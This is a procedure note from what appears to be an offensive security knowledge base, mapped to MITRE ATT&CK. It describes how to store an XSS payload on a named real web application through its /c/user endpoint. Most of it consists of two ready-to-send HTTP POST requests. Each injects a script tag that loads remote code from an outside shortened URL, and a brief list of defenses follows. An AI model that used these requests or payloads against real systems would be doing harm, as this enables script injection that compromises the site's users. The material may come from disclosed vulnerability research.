---
tags:
  - xss
  - http-post
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-malicious-uuid-form-urlencoded]]'
  - '[[commands/post-malicious-uuid-json]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c8b0fa65-7a43-41c0-9553-53bea3fca8ee
created_at: '2025-12-13T23:56:20.214Z'
updated_at: '2025-12-13T23:56:20.214Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit Malicious UUID via POST

## Summary

This procedure submits the crafted malicious UUID to the /c/user endpoint via POST request to store the XSS payload.

## Description

Using form-urlencoded content type, the payload is injected into the UUID field along with email and brand URL. JSON format may not work as the server overrides the UUID.

## Requirements

1. HTTP client (e.g., curl or Burp)
2. Valid email for submission
3. Crafted payload from prior step

## Defense

Defensive measures and detection strategies:

- Require server-generated UUIDs
- Input validation on all parameters
- Rate limiting on account creation endpoints

## Objectives

1. Store the malicious UUID
2. Confirm acceptance without validation
3. Enable later triggering

## Instructions

### Step 1: Send Form-Urlencoded POST

**Context**: Submit the payload in form-urlencoded format.

Execute [[commands/post-malicious-uuid-form-urlencoded]]:

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

> Expect HTTP response confirming creation.

### Step 2: Test JSON POST (Optional)

**Context**: Attempt submission in JSON format.

Execute [[commands/post-malicious-uuid-json]]:

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
Connection: close
Content-Length: 118
Accept: application/json
Origin: https://app.upserve.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/json
DNT: 1
Referer: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi
Accept-Language: en-US,en;q=0.8
Cookie: <x>

{"uuid":"</script><script src=//is.gd/z0i2sU>","email":"asuka@asuka.h1","brand_pretty_url":"ace-wasabis-rock-n-roll-sushi"}
```

> Server generates its own UUID, ignoring payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/post-malicious-uuid-form-urlencoded]]
- [[commands/post-malicious-uuid-json]]

## Tools Used



## Tags

- xss
- http-post
